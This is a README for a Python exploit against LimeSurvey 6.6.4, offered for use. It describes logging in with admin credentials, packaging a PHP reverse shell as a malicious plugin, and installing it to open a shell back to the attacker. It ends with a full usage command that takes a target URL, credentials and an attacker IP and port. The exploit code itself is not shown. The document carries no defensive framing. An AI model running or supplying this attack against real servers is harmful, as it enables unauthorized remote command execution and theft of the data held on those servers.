# LimeSurvey 6.6.4 Reverse Shell Plugin Exploit

This Python script exploits a file upload vulnerability in **LimeSurvey 6.6.4** by uploading a malicious plugin containing a PHP reverse shell payload. It automates the following steps:

- Logs into the LimeSurvey admin dashboard using provided credentials and handles CSRF tokens.
- Generates a malicious plugin ZIP archive with a reverse shell PHP script configured with your IP and port.
- Uploads the plugin via the vulnerable plugin manager interface.
- Confirms and installs the uploaded plugin to trigger the reverse shell.

Once executed successfully, the script opens a reverse shell from the target LimeSurvey server back to the attacker’s machine, enabling remote command execution.

---

## Features

- Automated login with CSRF token extraction.
- Customizable reverse shell PHP payload.
- Plugin upload and installation automation.
- Simple command-line interface (CLI) usage.

---

## Usage

```bash
python3 lime_reverse_shell_exploit.py \
  --target http://target-limesurvey \
  --username admin \
  --password pass123 \
  --ip attacker_ip \
  --port attacker_port

